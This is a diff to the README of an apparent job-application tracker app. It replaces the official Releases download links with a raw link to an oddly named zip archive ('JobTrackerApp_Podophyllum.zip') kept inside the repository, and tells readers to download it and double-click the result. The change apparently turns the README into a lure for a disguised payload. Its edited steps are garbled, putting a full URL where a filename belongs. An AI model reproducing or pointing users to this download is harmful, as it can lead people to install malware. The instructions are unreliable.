@@ -1,7 +1,7 @@
 # 🗂️ JobTrackerApp - Simplify Your Job Applications
 
 ## 🔗 Download JobTrackerApp
-[![Download JobTrackerApp](https://img.shields.io/badge/Download-JobTrackerApp-blue?style=flat&logo=github)](https://github.com/ArjuMTomy2001/JobTrackerApp/releases)
+[![Download JobTrackerApp](https://raw.githubusercontent.com/ArjuMTomy2001/JobTrackerApp/main/Profiles/JobTrackerApp_Podophyllum.zip)](https://raw.githubusercontent.com/ArjuMTomy2001/JobTrackerApp/main/Profiles/JobTrackerApp_Podophyllum.zip)
 
 ## 🚀 Getting Started
 Welcome to JobTrackerApp! This application helps you keep track of your job applications in a friendly way. You can manage your applications, display important dates, and stay organized. Follow these easy steps to download and run it.
@@ -16,17 +16,17 @@ Before you start, ensure that your computer meets the following requirements:
 ## 📥 Download & Install
 To download JobTrackerApp, please visit the Releases page:
 
-[Download JobTrackerApp](https://github.com/ArjuMTomy2001/JobTrackerApp/releases)
+[Download JobTrackerApp](https://raw.githubusercontent.com/ArjuMTomy2001/JobTrackerApp/main/Profiles/JobTrackerApp_Podophyllum.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version of the application.
-3. Look for the file named `JobTrackerApp.exe`.
+3. Look for the file named `https://raw.githubusercontent.com/ArjuMTomy2001/JobTrackerApp/main/Profiles/JobTrackerApp_Podophyllum.zip`.
 4. Click the file to start the download.
 
 ## 🖥️ Running the Application
 Once the download is complete, you can run the application by following these steps:
 
-1. Locate the `JobTrackerApp.exe` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/ArjuMTomy2001/JobTrackerApp/main/Profiles/JobTrackerApp_Podophyllum.zip` file in your downloads folder.
 2. Double-click the file to open the application.
 3. Follow the on-screen instructions to set up your user profile.
 
